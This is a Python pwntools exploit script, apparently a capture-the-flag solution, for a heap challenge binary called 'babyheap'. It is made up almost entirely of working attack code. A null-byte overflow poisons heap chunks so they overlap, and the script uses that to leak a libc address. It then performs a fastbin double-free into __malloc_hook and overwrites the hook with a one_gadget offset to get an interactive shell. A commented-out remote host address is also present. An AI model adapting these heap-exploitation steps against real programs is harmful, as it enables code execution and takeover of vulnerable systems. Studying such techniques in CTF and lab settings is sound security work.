from pwn import *
g_local = True
e = ELF("./libc.so.6")

def padding(length):
	assert length % 8 == 0
	return (p64(0x1234) * (length/8))[:length-1] + "\n"

command = "/bin/sh\x00" + padding(0xf0)

if g_local:
	sh=process("./babyheap")
else:
	sh=None#remote("123.206.22.95",8888)



def alloc(data):
	size = len(data)
	sh.send("1\x00")
	sh.recvuntil("please input chunk size: ")
	sh.send(str(size) + "\x00")
	sh.recvuntil("input chunk content: ")
	sh.send(data)
	sh.recvuntil("choice: ")

def show(idx):
	sh.send("2\x00")
	sh.recvuntil("please input chunk index: ")
	sh.send(str(idx) + "\x00")
	sh.recvuntil("content: ")
	ret = sh.recvuntil("choice: ")
	return ret[:ret.find("\n")]

def delete(idx):
	sh.send("3\x00")
	sh.recvuntil("please input chunk index: ")
	sh.send(str(idx) + "\x00")
	sh.recvuntil("choice: ")

#initialize chunks
assert len(command) == 0xf8
alloc(command) #0
alloc(padding(0x100)) #1
alloc(padding(0x100)) #2
alloc(padding(0x100)) #3
alloc(padding(0x100)) #4 seperator
alloc(command) #5
alloc(padding(0x100)) #6
alloc(padding(0x100)) #7
alloc(padding(0x100)) #8 seperator

#first phase of exploitation: leak
delete(0)
delete(1)
delete(2)

alloc("A" * 0xf8) #0 overflow size to 0x100
alloc(padding(0xf0)) #1
alloc(padding(0xf0)) #2

delete(1)
delete(3)
#null poison triggered

alloc(padding(0xf0)) #1
alloc(padding(0xf0)) #3

#now 2 and 3 points to same heap address

delete(3)
libc = u64(show(2) + "\x00\x00") - 0x3c4b78
print hex(libc)
alloc(padding(0x100)) #3
alloc(padding(0x80)) #9
alloc(padding(0x80)) #10
#clear unsorted bin for next exploitation

#now >= 11 is empty
#next phase of exploitation: getshell

delete(5)
delete(6)

alloc(p64(0x1234) * (0xf8/8)) #5, null byte overflow here
alloc(padding(0x80)) # 6
alloc(padding(0x60)) # 11


delete(6)
delete(7)
#trigger null poison


#now now 567 >8 is empty

alloc(padding(0x80)) #6
alloc(padding(0x60)) #7
alloc(padding(0x60)) #12

#now 7 and 11 are same, and they belong to fastbin

delete(7)
delete(12)
delete(11)

#now in 0x70 fastbin, it is a -> b -> a -> ... form

#now do fastbin dup into __malloc_hook
#7 and >=11 are NULL


alloc(p64(libc + e.symbols["__malloc_hook"] - 0x23) + "A" * 0x58) #7
alloc(padding(0x60)) #11
alloc(padding(0x60)) #12
payload = "A" * 0x13 + p64(libc + 0xf1147)
payload += "\x00" * (0x60 - len(payload))
alloc(payload)
sh.interactive()
